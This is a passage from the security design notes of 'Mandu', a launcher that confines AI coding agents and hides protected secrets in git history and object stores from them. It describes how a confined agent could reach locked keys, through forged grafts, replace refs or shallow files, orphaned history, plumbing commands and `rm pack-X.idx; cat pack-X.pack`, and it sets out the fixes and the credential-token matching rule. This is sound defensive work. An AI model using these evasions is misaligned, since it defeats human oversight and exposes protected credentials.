  `refs/bisect` and a `refs/worktree` ref written in its reftable each
  change the fingerprint) and
  `launcher/test/component/prefetch-reftable-worktree.test.ts` (a real
  reftable repository: after the prefetch read the tips, the worktree's
  HEAD moves to a commit nothing else reaches, holding a protected version;
  the version is locked and its loose copy unreadable, as without the
  prefetch). Both fail without the fix (the second: the prefetched state
  is used and the version is not locked); both skip on a git older than
  2.45, which cannot make a reftable repository.
  **Paced, and its inputs pinned (2026-10-21).** The fingerprint is the
  same lstat and readdir calls in the same order, handing the event loop
  back every 4 ms (reflog-tips.ts `Pacer`; runtime-instances.md §14.12):
  over this repository's worktrees it held the main thread 25-35 ms in one
  go. The pacing leaves its digest unchanged, and a unit test pins the
  covered set: on a fixture holding every input above (a linked worktree
  with its own `config.worktree`, refs, logs and `reftable/`; the common
  dir's `config.worktree`, `shallow` and `reftable/`; an alternate object
  directory; a loose fan-out directory) the entries are exactly that set,
  enumerated by the test independently of the walk, so an input dropped
  from the walk fails it.
  Tests: `launcher/test/unit/twin-prefetch.test.ts` (a secret committed
  between the prefetch and the use, only in the history, is found and
  excluded; a new loose object, a config change, a worktree added, a racy
  fingerprint each discard it; what changes the fingerprint; a failing
  prefetch; close leaves no process and no file) and
  `launcher/test/kernel/git-object-twins.test.ts` (the twins identical with
  and without the prefetch, and the committed-between secret unreadable
  through the real wrap from both work trees). On this repository (a worktree of a
  store with ~180 worktrees, seven sanitized packs of 74 MB, warm caches, a
  loaded host, medians of nine fresh processes): the twin step 237 ms
  before, 91 ms with the prefetch started 0.6 s ahead; the hashes alone on
  workers save 10-50 ms (the largest pack bounds them).
- **One git sandbox for the launch's reads** (2026-10-16,
  `launcher/src/git-session.ts`, write-protection.md §8.5.3). Every git
  call of the step ran in a bubblewrap of its own (§8.5 there): about
  17 ms of namespace set-up each, which the kernel serializes (eight at
  once: 70 ms a batch sandboxed, 12 ms plain), so a launch's 30-70 calls
  (the step, the prefetch, the placeholder watch) spent most of the step
  making namespaces. Now the launch opens ONE git session when it starts
  (`run.ts`, beside the prefetch, warmed so its start-up overlaps the
  services'): one bubblewrap with the probe's flags runs a small request
  runner that starts each git call inside it, concurrently, with the same
  hardened arguments, environment, cwd, stdin, deadline (its whole group
  killed) and failures; the answers are byte-identical. The calls stay
  apart: the session sandbox has an empty read-only `/proc` (no call can
  open another's pipes or memory), and a session is used only where Yama's
  `ptrace_scope` is 1 or more (no call can attach to another); elsewhere
  every call keeps a sandbox of its own (write-protection.md §8.5.3, which
  also says what remains: a sibling killed, which fails closed). A call that writes
  (the pack build binds the cache) still runs one sandbox of its own, as
  does every call where no bubblewrap sandbox exists (none, macOS). FAIL
  CLOSED: the runner ending (a crash, a kill, an unreadable frame, a kill
  or a straggler that does not let go) fails every call in flight, which
  refuses the launch as any failed git call does (`GitObjectTwinError`,
  unless `--best-effort`), and the session's later calls run one sandbox
  each; a runner that never started ran nothing, and its calls run one
  sandbox each. The session is closed with the prefetch, on every path,
  right after the secret setup; a forgotten one holds no reference on the
  event loop and dies with the launcher (`--die-with-parent`). The
  placeholder check after the agent exits keeps one sandbox per call: a
  fresh session there cost more than it saved (its runner's node start,
  with nothing left to hide it behind), and one kept alive through the
  agent's run is excluded (runtime-instances.md §14.12). Re-examined
  2026-10-22 (same section): any sharing there needs the session's
  isolation, so its runner, and a shell-run batch would be a second
  runner whose slip reads as "clean"; kept. What a launch asks of git is
  counted per step instead (each step's `git` and `sandboxes` on the
  launch's events) and held per push: at most about eight calls per work
  tree before the agent, in the one session sandbox, and two per work
  tree after it (runtime-instances.md §14.11, "The git budget, per
  push"). Tests: the
  session's protocol and every failure path with no privilege
  (`launcher/test/unit/git-runner.test.ts`), one sandbox (one pid and net
  namespace for all calls), byte-identical answers and nothing left behind
  in the real sandbox (`launcher/test/kernel/git-sandbox.test.ts`), and the
  step's twins, sanitized packs and locked ids identical to the per-call
  runner's, a runner killed under the step refusing it
  (`launcher/test/kernel/git-object-twins.test.ts`). Measured on the dev
  host (load average 30-120; the step over four repositories in `$HOME`,
  one of them a worktree of this repository's store, warm walk and pack
  caches, 30 git calls; medians of 12 runs in four fresh processes each):
  270 ms with a sandbox per call, 140 ms in a warmed session (265 ms in a
  cold one: the runner's node start, about 130 ms on that host, is what
  the launch's early warm-up hides). Thirty cheap calls eight at a time:
  265 ms with a sandbox per call, 96 ms in a session, 149 ms with no
  sandbox at all (the session's small runner forks git faster than the
  launcher's large process does).
- **The same question once** (2026-10-21, `launcher/src/git-shared-answers.ts`,
  `secret-setup.ts`). The history step and the placeholder watch ("A
  placeholder in your repository" below) run at the same point of the
  launch, at once, after the twins are planned and before the agent
  starts, and both asked each watched work tree `rev-list --all --no-walk`
  (its tips) and `ls-files -s -z -- <its protected files>` (their index
  entries). Now the two go through one runner, scoped to them and closed
  when both are done, that starts an identical call (the same arguments,
  work tree, stdin and environment) once and hands both the answer; the
  watch spells its index call as the step does. Nothing is skipped and
  nothing is kept: every check still runs on git's answer at that point;
  the prefetch keeps its own runner (the step reads its facts and config
  again to check a prefetched state, and those reads stay apart), and the
  placeholder check after the agent exits asks git afresh, since the agent
  may have committed by then. Each caller keeps its failure handling and
  its deadline: the answer is the call's, a failure included, so a failed
  call still refuses the step (`GitObjectTwinError`) and still costs the
  watch the tips (or, for the index, the repository); a caller joining a
  call with a deadline as long as its own or longer waits at most its own
  deadline (the watch's 5 s) and then gets the runner's cut-off answer; one
  joining a call with a shorter deadline (the step, 120 s, joining the
  watch's 5 s call) takes only a success, and a failure is asked again
  under its own. A call that writes (the pack build) is never shared.
  Tests: `launcher/test/unit/git-shared-answers.test.ts` (one call per
  identical question, a difference of any kind its own, the deadlines both
  ways, a failure to every caller, nothing shared after close) and
  `launcher/test/component/launch-git-shared.test.ts` (real repositories:
  two calls become one per work tree with the same twins, locked ids and
  watch; a failing `rev-list` or `ls-files` refuses the step and costs the
  watch exactly what it did; the check after the session finds a
  placeholder committed in it). A work tree whose read fails waits for its
  other reads before the step gives up (2026-10-21): before, its history
  walk went on after the refusal and wrote its cache entry later (unsealed,
  so never trusted, but outside the step's lifetime; the component test
  pins that no call of the step outlives it). On the developer host, `mandu claude
  --version` from a plain directory (four watched work trees in three
  stores): 63 git calls to 55; the launch time does not move measurably
  (the watch's calls ran beside the step's, off its critical path).

**What the walk does not let a repository hide (security fix,
2026-10-21).** The walk found a file's protected versions by `git log`,
which sees history as the repository rewrites it: a graft (`info/grafts`),
a replace ref (`refs/replace/*`) or a shallow file (`shallow`) cuts commits
out of the walk while their objects stay in the store. An agent can write
all three into `.git` in a confined session; the next launch's walk then
started anew (each was in the walk's base key) and missed every version
only the cut-off commits held, which `git show <commit>:<file>` still read
(reproduced on the code before the fix: a graft and a replace ref each left
the older versions out of the locked set). Now:

- **Grafts and replace refs are off for every hardened git call**
  (`hardened-git.ts`, all four copies: `GIT_NO_REPLACE_OBJECTS=1`,
  `-c core.useReplaceRefs=false`, `GIT_GRAFT_FILE=/dev/null` with its
  deprecation hint off). That covers the walk, the tips (a tag is peeled
  to the object it names), the placeholder watch and its check after the
  session, the arbiter's resolver (`lock-resolution.ts`) and its history
  scan, the prepared copies. A replace ref is still a ref: `--all` names
  its target, so a protected version reachable only through a
  replacement is walked and locked like any other. The pack plan, the
  loose-object scan and the blob locks go by object name and never
  depended on either. A repository that grafts away history it does not
  have (the long-deprecated way to fake a shallow clone) now fails the
  walk on the missing parents, which refuses the launch unless
  `--best-effort`.
- **The shallow file is honoured only where it is true**
  (`history-labels.ts` `walkShallowRule`, in both mirrors). A `git clone
  --depth` keeps nothing past its boundary, so a walk that ignored the
  file would fail on the missing parents; an agent-written file, though,
  lists commits whose parents ARE in the store. So the walk reads the
  parents of every commit the file names (`rev-list --no-walk --parents`
  past the file, then `cat-file --batch-check`): when none is in the
  store the file is honoured; otherwise (a forged entry, a line that is
  not an object name, a git call that fails) the whole file is ignored
  (`--shallow-file ""`) and the walk goes through every present parent.
  A forged entry beside a true boundary makes that walk fail on the true
  boundary's missing parents, which refuses the launch: fail-closed, never
  a shorter walk. The rule cannot be defeated by writing `.git/shallow`;
  it is decided again at every launch (the parents' presence is in the
  prefetch fingerprint: the object directories), and an empty or absent
  file costs no git call. The rule is chosen over a store-wide scan of
  every tree present (the alternative that needs no reachability) for its
  cost: two cheap calls on a shallow clone, none elsewhere. The
  placeholder check after the session applies the same rule before its
  walk, so a shallow file written in the session cannot cut a placeholder
  commit out of it.
- **The caches of the old rule are never used.** The walk's base key now
  holds the rule (`HISTORY_WALK_REWRITES`) and only the shallow boundary
  honoured (no grafts or replace refs, which no longer change the walk;
  the step's `for-each-ref refs/replace/` call is gone), so every cached
  walk and every arbiter resolution keyed by the old base misses once and
  is walked anew: a one-time full walk per repository after the upgrade
  (the arbiter's resolutions too). A launcher and an arbiter of different
  versions compute different resolution keys, so the launcher walks
  itself rather than use the arbiter's answer. The prefetch fingerprint
  no longer stats the grafts file: `--git-path info/grafts` now names
  `/dev/null`. The history scan's cache (`secret-discovery.md` §3) no
  longer refuses a repository for an `info/grafts` file; a shallow clone
  is still not cached there. Since a follow-up the same day the scan's
  listing and its traces apply the same shallow rule
  (`secret-history-scan.ts`, one `rev-parse` more per repository), so a
  shallow file written over a full history hides no key from its
  suggestions either (`arbiter/test/unit/secret-history-scan.test.ts`).
- **Said when it refuses.** A walk that fails on a missing parent where a
  rewrite explains it refuses the launch in plain words
  (`historyWalkFailure`): a `.git/info/grafts` file over history the
  repository does not have ("a git feature git has deprecated"; the fix:
  turn the cut into a shallow boundary, `cut -d' ' -f1 .git/info/grafts >>
  .git/shallow && rm .git/info/grafts`, or fetch the history; `git replace
  --convert-graft-file` would not help, replace refs are off too), or a
  shallow file naming a commit whose parent IS in the repository beside a
  true boundary (restore it with `git fetch --depth=<n>`, or `git fetch
  --unshallow`). The first launch after a change of the walk's base key
  says why it is slower, the plan 14 §11.2.1 "rebuild notice" with the
  cause `walk-changed`. Tests: `launcher/test/component/history-rewrites.test.ts`.

Tests: `launcher/test/component/history-rewrites.test.ts` (a graft, a
replace ref and a forged shallow file each leave every version locked and
unreadable in the agent's world, the twins applied to a copy of the
repository and git run there with every rewrite off; a version reachable
only through a replacement is locked; a `clone --depth 2` launches with
its versions locked, and a forged entry beside its boundary refuses the
step; the placeholder check finds a placeholder commit a session's shallow
file would have hidden; the base key is never one of the old rule's), the
rule's unit tests (`launcher/test/unit/history-labels.test.ts`), the
hardened environment's (`launcher/test/unit/hardened-git.test.ts`), and
the arbiter's resolver against the launcher over the same four
repositories (`tests/stack/lock-resolution-parity.test.ts`: the same
versions and key). Each behavioural test fails on the code before the fix.

**A version once locked stays locked (security fix, 2026-10-21).** The walk
finds what git can REACH, and an agent can write `.git`: it can make a
protected version unreachable while its objects stay in the store, and so
readable to `git cat-file -p <name>` once the twins stop hiding it (the
name read from a tree that survives, or seen in the session's own `git log
--raw`). Two ways were open. A loose commit deleted under a forged shallow
boundary makes the boundary look true to the shallow rule above, which
then honours it. And with no shallow file at all, an orphan branch with
the old branch deleted and the reflogs expired leaves the old commits
reachable from nothing: the walk cache kept their versions (a tip gone
away keeps its names) only until it was walked anew, which a new seal
epoch, a new walk rule or a new git all cause; then the versions left the
twins. Both were reproduced (`launcher/test/component/locked-memory.test.ts`
on the code before: version 2, then version 1, not locked).

So each object store has a **locked memory** (`launcher/src/locked-memory.ts`,
`<state>/object-walks/locked-memory/<key>.json`, where the agent can
neither read nor write): every (version, path) a launch found protected, by
path or by label, in the history, the index or a working copy. At every
launch each remembered version whose path is protected NOW (a protected
file of a work tree of the store, or a path a label above `public`
decides) joins what the walk found: excluded from the sanitized packs, its
loose copy unreadable, its id in the guard's locked set, reachable or not.
A path no longer protected (the human took its label or its registration
away) brings nothing back. The memory is only ever added to and a name in
it only hides more, so it carries no seal: a record something outside
Mandu removed or garbled reads as empty, which leaves the walk's own
answer, never less. The walk rule's marker moved (`rewrites:v2`), so every
repository is walked once more and its memory filled from a full walk.
The arbiter's background resolution keeps the same rule: a resolution
walked anew for the same labels and pathspecs keeps every version the one
before it held (`lock-resolution.ts`; `arbiter/test/unit/lock-resolution.test.ts`).

This answers the class this section long accepted, "objects reachable from
nothing are not walked", for every version a launch has seen protected.
It left open a version NO launch ever found protected: history cut before
Mandu first walked that repository with that path protected (an agent
session in another workspace that reached the repository's `.git`, before
the human labelled the file), a tree in no ref (`git write-tree`), and a
blob written and abandoned by plumbing (`git hash-object -w`). Each was
readable by name through the object twins. The store scan below closes
them.

**Every stored object is checked once (security fix, 2026-10-21).** The
history step also reads the OBJECT STORE, not only what git reaches
(`launcher/src/store-scan.ts`, from `prepareGitObjectTwins`, beside the
walks of each store):

- **What is new.** Each object directory the store reads (alternates
  followed) is listed: every pack's `.idx` and every loose fan-out
  directory. An id this store's scan has not seen is new. A new loose
  object is read in the launcher (inflated, its header, and its body unless
  it is a blob; anything it cannot read with certainty, git is asked); the
  rest are asked of git (`cat-file --batch-check`, then `--batch` for
  trees, commits and tags, in bounded batches through the launch's git
  session, a `binary` call so a tree's raw ids arrive byte for byte).
- **Where each blob lies.** A commit's (or a tag's) tree is a root. A tree
  a new tree names is at that tree's place plus the entry's name; an OLD
  tree named at a place it was never recorded at (a renamed folder, a
  subtree reused) is read again there. A new tree that no root reaches and
  no other such tree names (`git write-tree`, the trees `git stash` and a
  merge write, a subtree whose parent is gone) has no known place: it is
  read as a root AND under every folder above a protected path or a
  label's pathspec, so `config/`'s orphaned content is found for
  `config/.env`. Every (blob, path) a tree names is recorded, for every
  path, not only the protected ones: a path protected later (a new label, a
  new protected file) finds its versions among the records with no new
  scan. The versions at the paths protected now join the walk's: excluded
  from the sanitized packs, their loose copies unreadable, their ids in the
  guard's locked set, and remembered (the locked memory above).
- **A blob no tree names** (no path to decide it by) is hidden when its
  content shares a credential-like token with a protected version of the
  store: a run of 12 or more of `[A-Za-z0-9+/_.~-]` holding a letter and a
  digit (a key, a token, a digest, a PEM line), or a `KEY=value` line whose
  value is 8 or more characters, compared with every protected version
  known (the walk's, the index's, the working copies, the memory's, the
  scan's). A name alone (`ANTHROPIC_API_KEY`) is not a token, so code that
  names a variable shares nothing with the file that sets it. A blob an
  index of the store holds (a staged file, its path in that index) is not
  hidden this way; once no index holds it, it is checked again. A hidden
  blob is remembered as a version of that protected path, for good: a tree
  written later naming it (the agent can write one, `git mktree --missing`,
  without reading it) does not bring it back, and the path no longer
  protected does. Blobs over 4 MiB are not read for this.

**The cost is paid once per object.** Per object store the scan keeps,
under `<state>/object-walks/store-scan/<key>/` (where the agent can neither
read nor write), the ids it has seen, the (object, place) records and the
path table, and a `state.json` that names them by identity (device, inode,
size, mtime, ctime), holds each directory's fingerprint and the answer for
each set of protected paths (one per set; launches from different work
trees of one store may differ). `state.json` is SEALED like the walk cache
(kind `store-scan`, plan 14 §11.2): only a seal of the current epoch is
trusted, else the store is scanned anew, and so is anything a sealed state
does not vouch for (a data file not as recorded, a torn file, a new rule).
A launch with nothing new stats each object directory, its `pack/` and its
fan-out directories, finds them unchanged, takes the answer and asks git
nothing; a directory changed within two seconds of a scan is never trusted
unchanged at the next (git's "racily clean"). A repack costs reading the
new `.idx` and merging it with the ids seen (no id is new: git is asked
nothing). A commit's objects are loose: read in the launcher, git asked
nothing. Measured in process on this repository's store (115k objects,
39 packs; a loaded host, load average above 30, medians; end to end in
runtime-instances.md §14.13): a launch with nothing new 1.4 ms; after a
commit 24 ms; the first scan 2.6 to 2.9 s, said once before
the work by the rebuild notice with the cause `store-scan` ("Mandu checks
every object a repository stores once, history no branch reaches
included"), for a store of 20,000 objects or more. A new seal epoch scans
every store anew, as it rebuilds the sanitized packs.

**Fail-closed.** A git call that fails, an index file that cannot be read,
a malformed tree or answer fails the store (the launch refuses unless
`--best-effort`, which names the repository). A store holding more than
4,000,000 objects (`MANDU_GIT_STORE_SCAN_MAX_OBJECTS`), or more than a
million distinct paths, is not scanned, and the launch says so in a
WARNING: there, the residual above stays.

**What stays open.** A pathless blob that shares no token with any
protected version (an older `.env` whose every value was rotated and every
line changed) is not hidden: nothing ties it to a protected file. Nor is
one over 4 MiB. A tree with no known place under a label whose pattern has
a wildcard folder (`deploy/*/key`, the tree being `prod/`) is read only at
the folders the pattern names literally. The arbiter's background
resolution (plan 14 §11.1 R2) and its prepared copies still go by what git
reaches and by the global locked set, so a repository no launch prepares
(the guard's backstop) gets the scan's finds only once a launch prepares
it. Objects written after the launch are the next launch's, as before.

Tests: `launcher/test/unit/store-scan.test.ts` (the sorted sets, git's
answers, tree entries, loose objects, the token rule, the places of a tree
nothing names, the kept state's shape; and over real repositories: a
second scan with nothing new asks git nothing and reads nothing, a repack
asks git nothing, a commit's loose objects are read here, a racy directory
is listed again, history no ref reaches, a renamed folder, a tree no
commit names, a parentless subtree, a new set of protected paths answered
from the records, a new epoch, a changed data file and a garbled state
scanned anew, the pathless blob rule with its index exception and its "for
good", the cap) and `launcher/test/component/store-scan.test.ts` (through
the step with the production git session: a cut history, packed and
loose; a tree in no ref; a plumbing blob sharing a credential, and one
sharing nothing left readable; each hidden version locked, in no served
pack and unreadable by `git cat-file -p <id>` in the agent's world, the
rest read as before; a second launch with nothing new asks git nothing and
reads no object), and `launcher/test/kernel/git-object-twins.test.ts` (the
three together, read by id and by `cat-file --batch-all-objects` through
the real wrap). The component test fails with the scan off. An id git
cannot answer when asked (gone, unreadable at that moment) is not taken as
seen: where it was listed is listed again, and it is asked again, at the
next launch (unit-tested).

The walk cache is security-relevant: an entry with a version left out would
leave that version readable at the next launch. It sits in the Mandu home's
`state/`, which the agent can neither read nor write (`write-protect.ts`
`ownFiles` and the whole-home deny, on-disk-layout.md §4). A unit test pins
that the walk cache directory is inside that set.

**The caches are sealed (confidentiality-plan-14 §11.2).** The deny keeps a
CONFINED agent out, but something unconfined (an `off` session, a `gated`
launch, an agent run outside Mandu) can write the home, and a forged entry
would land in a later `secrets` session: a cached pack holding the real
bytes under a clean `.idx`, a walk entry with a version left out, or a
history-scan entry marking a finding's blob clean. So every enforcement
cache entry (a sanitized pack's `.pack`, `.idx` and `.rev`; a walk entry; a
history-scan entry) is sealed with the arbiter when it is written, `(kind,
key, sha256, size)` stamped with the arbiter's current EPOCH, and used only
when its bytes match a seal of the current epoch; anything else is rebuilt,
and an admin event names the kind and key (no content). The arbiter starts
a new epoch, voiding every older seal, whenever an unconfined period ends
(an unconfined launch ends, or the arbiter starts after an unclean shutdown
with no unconfined launch live); while an unconfined launch runs no seal is
honoured. The seal ops are human plane. The `.idx` check stays. Residuals
and the out-of-scope line (a same-uid process outside Mandu forging Mandu's
own records): plan 14 §11.2.

**A key only in history (C17).** A key committed and then deleted is in no
walk that starts from the files protected now. `mandu doctor --secrets`
finds such blobs (the arbiter op `scanSecretHistory`, masked findings), and
plan 14 turns each into a rule the human approves (`secret-discovery.md §3`).
Two rules close it, both enforced by the twins above (plan 14 §8.1, §8.2):

- **Gone paths.** The launcher asks the arbiter for `gitHistoryLocks` (data
  plane; `{axis, blobs, labels}`), whose `labels` are EVERY human label:
  policy.yaml `paths:` and the dashboard's "Lock it" store, the same merged
  map every derivation reads, `public` ones included. A repository is
  walked for them when a labelled path lies in it (found through its
  nearest existing folder, so a deleted file still leads to its repository)
  or it is the launch's workspace. The walk is bounded by the labels'
  literal prefixes (`git log -- deploy/id_rsa`; the whole history when a
  recursive label covers the repository or a pattern may match anywhere in
  it), reads each change's path with its blob (`--raw -z`), and keeps the
  blobs of the paths a label puts above `public`, decided by the arbiter's
  own precedence (`launcher/src/history-labels.ts`, a mirror pinned to
  `resolvePathLabel` by a parity test). A label written through a symlink
  also decides under its real spelling. The walk is cached like the walk by
  path, keyed by the labels as well. The catalog alone does not hide a gone
  path: a deleted `.env` is a scan finding until the human locks it (plan
  14 §4). Derived labels and declared model client keys are not history
  locks.
- **Blob locks.** policy.yaml `blobs:` (`lock-blob`, plan 14 §8.2) names a
  git object by id, `sha1:<40 hex>` or `sha256:<64 hex>`. Every lock above
  `public` is added to the protected versions of each repository of that
  object format the twins read, which reaches the workspace's repository
  even with no labelled path in it. The object is excluded from the
  sanitized packs and any loose copy made unreadable, and the pack cache
  key holds it. The current file stays readable unless its own path is
  labelled (the case of a key that once sat inline in a file that is public
  now). A `public` blob lock hides nothing, and never un-hides a version a
  path label hides (the twins hide the union).

Both are fail-closed: a lock read that fails, or an answer of the wrong
shape, refuses the launch unless `--best-effort` (which still hides the
confined files' history); an arbiter older than the op holds no blob lock,
so that launch says so and proceeds without the gone-path walk. Where no
file is confined at all, the twins still go up (the guard's policy and,
where the host can bind, a wrap started for them). Oracle:
`tests/sandbox/git-history-locks.test.ts` (C17 closed and the inline key,
through the real launch, the admin channel and the model proxy, with the
bind, K1 to K3, and with the guard alone, K4 and K5). Objects reachable
from nothing are not walked, but the store scan finds a labelled path's
versions among them ("Every stored object is checked once" above), and a
version a launch once found stays locked while its path is protected,
reachable or not ("A version once locked stays locked" above).

**The lock's reach (plan 14 §11.1 R1/R2).** The arbiter keeps a registry of
known repositories (mandu.db `known_repos`: every launch's workspace, every
scanned root, every work tree a label above `public` lies in,
`registerRepository`, and a background walk of HOME for `.git`, capped and
pruned like discovery) and resolves every path label into the blob ids of
its versions in each, in the background, with the launcher's own walk and
rule (`arbiter/policy/history-labels.ts`, pinned byte-identical to the
launcher's below its header, with a parity test). The union with the
`blobs:` locks is the GLOBAL LOCKED SET, answered by `gitHistoryLocks`
(`lockedSet`, `repos`, `complete`, `pending`); a clone or a fork holding the
same blob is covered by its id. The launcher uses a repository's resolved
versions in place of its own label walk only when the resolution key it
computes (root, labels, pathspecs, walk base, tips) equals the arbiter's;
otherwise it walks, so the answer can cost a walk, never a version.

**The guard's backstop (plan 14 §11.1 R4).** A repository the launch did
not prepare twins for (`git -C ~/work/api log -p` from a launch in
`~/other`, a clone or a fork holding the same blob) would otherwise serve a
locked key. The launcher hands the guard the LOCKED SET in its policy file
(`gitLocks: {ids, noticeFile}`): every `blobs:` lock above `public`, every
protected version its own walks resolved (merged in because the global set
can lag new commits by one arbiter cycle), and the arbiter's global set
(validated; a malformed one refuses the launch). With a lock in force it
also sets `MANDU_NET_GUARD_PROTECT=1`, so the rename, link, unlink and
truncate family is trapped (`launcher/src/git-lock-backstop.ts`). In the
guard (`interceptors/net-supervisor/src/git_lock.rs`):

1. **The prefilter.** The open is performed on a pinned descriptor as every
   read-capable open is, and the registered-secret lookup runs first (a
   prepared sanitized copy is an `object` entry and is served). Any other
   regular file is classified lexically: a pack or a companion
   (`pack-<40|64 hex>.pack|idx|rev|bitmap|mtimes`), a multi-pack index, or
   a loose object (a leaf of 38 or 62 hex digits, anywhere), or git's file
   of objects being written (`tmp_pack_*`, `tmp_obj_*`, anywhere; below).
   Everything else continues at once.
2. **The verdict.** A loose object is locked when its leaf is the tail of a
   locked id. For a pack family file the guard opens the directory IN ITS
   OWN VIEW, checks by `fstatat` identity that the pinned file is the one
   at that name, and searches the pack's `.idx` (`O_NOFOLLOW`) for the ids
   of its format by fanout table and binary search (the Rust port of
   `idxLookup`). A multi-pack index is judged by every `.idx` of its
   directory.
3. **The answer.** LOCKED or UNKNOWN (no index, an index that does not
   parse, a moved file) refuses the open with `EACCES`: fail closed. Git in
   that repository stops working for the session; no other repository is
   affected. A LOCAL CLONE of such a repository fails the same way: `git
   clone <path>` copies or hard-links every file of the source's object
   directory, and a locked loose object (or a pack holding a locked
   version) there is refused ("error: unable to open … Permission denied",
   the notice's `git-lock: no sanitized copy`), so the clone stops and no
   copy of the key is made (seen in the demo battery, 2026-10-16, cloning a
   workspace's bare origin whose loose objects held the key; `git clone
   --no-local` reads the same objects through `pack-objects`). Expected and
   fail-closed: a clone is a copy of the history, which holds the key. In a
   repository the launch prepared, a loose copy of a protected version is
   unreadable too (step 4 of the mechanism above), so a local clone of it
   stops the same way. The first refusal per repository emits a `net_action` deny
   (never a byte) and a line in the notice file; the launcher prints one
   notice per repository after the agent exits, with the two fixes (start
   Mandu there, or `mandu policy suggest --root`), and registers the
   repository with the arbiter (`registerRepository`). An agent's own git
   store is said apart, without those fixes (`agentGitStoreOf`,
   2026-10-11): OpenCode's snapshot history
   (`$XDG_DATA_HOME/opencode/snapshot`, `~/.local/share/opencode/snapshot`
   by default, or that shape under any data home), a git repository per
   project of the files OpenCode works on, for its undo; a copy taken
   before the person labelled a file holds it. A live walk of the
   first-session tour met it as "git was refused … start mandu in it".
   **What really happens** (measured 2026-10-11, K15 in
   `tests/sandbox/git-history-locks.test.ts`, driving the store as OpenCode
   1.18.13 does: a git directory initialised with `GIT_DIR` and
   `GIT_WORK_TREE`, written by `add` + `write-tree`, no refs): while the
   store is loose, tracking the work tree still works (it reads the
   placeholder); what reads the older history is refused: the old version's
   content (a full diff, OpenCode's undo across the label) and OpenCode's
   own `gc`; once its `gc` has packed the store, every read of that pack:
   the change list against an older snapshot, and tracking too (`write-tree`
   checks that every file's version is in the store, and an unchanged
   file's version is only in the refused pack, so OpenCode's new snapshots
   fail as well). K15b once passed tracking by timing: git's racy-clean
   check is by whole seconds, so a file written in the same second as the
   store's index was hashed again and its version written loose; the test
   now dates the unchanged file an hour back, as a real session's files
   are (a CI flake, 2026-10-11). The store is a git directory, not a work tree, so the
   arbiter's `registerRepository` refuses it, R3 never prepares its copy,
   and its own `gc` cannot drop the old objects: the refusal and the notice
   come back in every session where OpenCode reads that history. The
   notice (and the session page, `agent-page.ts`) therefore says: nothing
   needs doing for the secret; OpenCode's undo and cleanup of that history
   fail (once packed, its new snapshots too) and the notice comes back; to stop it, remove that folder outside
   Mandu (OpenCode starts a new history, which holds only the placeholder,
   and loses only the undo of earlier changes; K15 runs that too). Not
   built: preparing a sanitized copy of the store (its object directory
   added to the work tree's plan in `prepareGitObjectTwins`); it would keep
   OpenCode's undo of every other file working. The other supported agents keep no such store: Claude
   Code's file checkpoints are plain copies, Codex's undo snapshots are
   commits in the project's own repository, Goose keeps none, and
   OpenClaw's workspace is the agent's working folder, where the repository
   advice applies. The guard writes as
   itself, outside the agent's confinement, so the notice file is opened
   ONCE at policy load: owner-only, never through a symlink, a regular file
   with one link, at most 256 repositories per session.
4. **Keeping the object where it was checked.** A rename or hard link whose
   source is a LOCKED or UNKNOWN store file is refused, and a pack's `.idx`
   (the anchor of the verdict) is never removed, renamed over, or
   truncated while a pack is beside it: removing an index whose pack is
   gone from that directory runs ([`guard-file-identity.md`](guard-file-identity.md)
   §1). Removing a pack, a companion or a loose object runs. Only a
   refused read (an open, a rename or link source) is told in the notice
   and the `git-lock` event; a refused change of an index has an event of
   its own.
5. **The cache.** Verdicts are cached per (dev, inode, size, mtime) for the
   session; UNKNOWN is never cached.

Git writes a new pack as `objects/pack/tmp_pack_*` (a loose object as
`objects/xx/tmp_obj_*`), always by an exclusive create (`O_CREAT|O_EXCL`),
and links or renames it into place before its index. The backstop refuses
a final-named pack whose index is missing (else `rm pack-X.idx; cat
pack-X.pack` would read the key). The temporary name it once let through,
which left a leak (2026-10-17, plan 14 §11.1 "Left"): a `git gc`, `git
fetch` or `git add` the person runs OUTSIDE the session writes the locked
version there, and the agent could read it until git renamed it. Now a
temporary file is the session's own only when the guard performed the
exclusive create that made it (remembered by path, device and inode, at
most 4096, the oldest forgotten: `GitLockGuard::created`); its open, its
rename and its link (git's own finishing step) run. Any other one is
UNKNOWN: an open, a rename or a link of it is refused and told like any
refusal. Other implementations' temporary names (libgit2, JGit) are not
recognized. Left open: a store file renamed or linked BEFORE the session,
a pack under a name that is neither `pack-<id>` nor in an `objects/pack`
directory (both readable before any lock reached them, the class of any
copy made before the label), and locked ids no walk reached. Cost: an
ordinary open costs the same with a lock in force (22 to 30 µs either way);
a cold lookup is about 0.01 ms for one id and under 1.1 ms for 200 ids in a
4 M-object index. Oracles: `guard_integration.rs`
(`a_locked_object_in_an_unprepared_repository_is_refused_and_a_clean_one_reads`,
`a_sanitized_copy_the_launch_prepared_is_served_before_the_backstop`,
`a_temporary_pack_another_writer_left_is_refused_and_the_sessions_own_git_writes_work`) and
the kernel e2e K6 (guard only) and K7 (with the bind) in
`tests/sandbox/git-history-locks.test.ts` (with an OpenCode snapshot store
holding the key: refused, and said apart with nothing to do; a `tmp_pack_*`
and a `tmp_obj_*` holding the key, as an outside `git gc` leaves them,
refused raw and inflated while the agent's own clone and loose fetch
work), K15a/K15b
(OpenCode's store, loose and packed, across two launches and a new
store); the notice's wording in `launcher/test/unit/git-lock-backstop.test.ts`,
the session page's in `dashboard/test/unit/view-model/agent-page.test.ts`.

**A history rewrite, and a protected file moved with its folder
(2026-10-16; the detail: [`guard-file-identity.md`](guard-file-identity.md)).**
After the agent rewrites a locked key out of history and git's repack
removes the twinned pack, the guard no longer takes a new file on the
removed pack's reused inode number for that pack (an identity-list hit
stands only for an inode unchanged since it was listed, or one the
registered path or its twin still names); an index may be removed once its
pack is gone from that directory (never while any pack is beside it), so
`git prune` removes the orphan; and only a refused READ is told in the
end-of-session notice (a refused change of an anchoring index is its own
`git-index` event). A folder renamed above a protected file
(`mv ~/.aws ~/.aws2`) no longer unmasks it: the guard holds every
registered protected file by an `O_PATH` descriptor (its inode cannot be
reused while held, so the identity match is exact for the session),
follows an editor's rename-over save, runs a folder rename under its
identity lock so every file it moved is held at its new path before the
answer, has the arbiter label the new path of every protected file and
derived copy below a moved folder (so the next session knows it), and,
past its descriptor budget, refuses a rename of any folder above a file it
could not hold. Every one of these fails closed.

**Copies prepared ahead of time (plan 14 §11.1 R3).** The backstop costs git
in an unprepared repository, so the arbiter prepares those copies in the
background (`arbiter/policy/prepared-copies.ts`, after every lock
resolution cycle, a rotation, or a launcher's report of a copy changed
under its seal): for every known repository, each pack whose `.idx` lists a
globally locked id, in every object directory the repository reads (its
own and every alternate it reaches, an alternate's alternates too: the
